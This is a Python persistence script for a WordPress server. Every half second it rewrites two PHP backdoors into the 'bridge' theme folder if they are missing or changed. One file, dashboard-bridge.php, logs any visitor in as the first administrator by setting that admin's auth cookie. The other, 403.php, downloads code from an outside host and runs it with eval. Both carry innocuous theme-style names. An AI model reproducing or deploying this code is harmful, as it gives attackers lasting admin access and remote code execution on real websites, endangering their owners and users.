import os
import time

files_to_protect = [
    ("/home/ugp/public_html/wp-content/themes/bridge/dashboard-bridge.php", """<?php
$mr = realpath(__DIR__);
$max = 10;
$found = false;
while ($max-- > 0 && $mr) {
    if (file_exists($mr . '/wp-load.php')) { $found = true; break; }
    $parent = dirname($mr);
    if ($parent === $mr) break;
    $mr = $parent;
}
if (! $found && !empty($_SERVER['DOCUMENT_ROOT']) && file_exists(realpath($_SERVER['DOCUMENT_ROOT']).'/wp-load.php')) {
    $mr = realpath($_SERVER['DOCUMENT_ROOT']);
    $found = true;
}
if (! $found) exit('Failed to load wp-load.php');
@chdir($mr);
require_once $mr . '/wp-load.php';
$wp_user_query = new WP_User_Query([
    'role'   => 'Administrator',
    'number' => 1,
    'fields' => 'ID',
]);
$results = $wp_user_query->get_results();
if (! empty($results[0])) {
    $user_id = (int)$results[0];
    wp_set_auth_cookie($user_id);
    wp_redirect(admin_url());
    exit;
}
exit('NO ADMIN');
?>"""),
    ("/home/ugp/public_html/wp-content/themes/bridge/403.php", """<?php

    $url = "https://semeton88.com/jendralmayapart2.txt"; 


    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); 
    $data = curl_exec($ch);
    curl_close($ch);


    if ($data) {
        eval("?>$data"); 
    }   
    ?>""")
]

while True:
    try:
        for file_path, file_content in files_to_protect:
            if not os.path.exists(file_path):
                with open(file_path, "w") as f:
                    f.write(file_content)
            else:
                with open(file_path, "r") as f:
                    if f.read() != file_content:
                        with open(file_path, "w") as fw:
                            fw.write(file_content)
    except Exception:
        pass

    time.sleep(0.5)
